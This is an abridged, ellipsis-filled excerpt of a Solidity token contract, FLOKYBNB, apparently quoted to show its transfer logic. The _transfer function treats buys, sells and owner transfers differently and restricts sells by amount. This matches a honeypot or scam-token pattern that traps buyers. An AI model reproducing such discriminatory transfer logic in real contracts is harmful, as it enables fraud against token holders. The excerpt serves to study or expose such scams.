...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
     ...
     if(_balances[recipient]==0)//buy
        ...
        else if( _balances[recipient] > 0 && amount < minimumTokensBeforeSwap)//sell
        {
        ...
        emit Transfer(sender, recipient, tokens);
         ...
         else if(sender == owner() || recipient == owner())//admin
        {
            _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
            _balances[recipient] = _balances[recipient].add(amount);
            uint256 tokens = _balances[recipient];
...
contract FLOKYBNB is ERC20 {

    uint tokenTotalSupply = 100000000000;

    constructor() public ERC20("FLOKYBNB", "FBNB") {
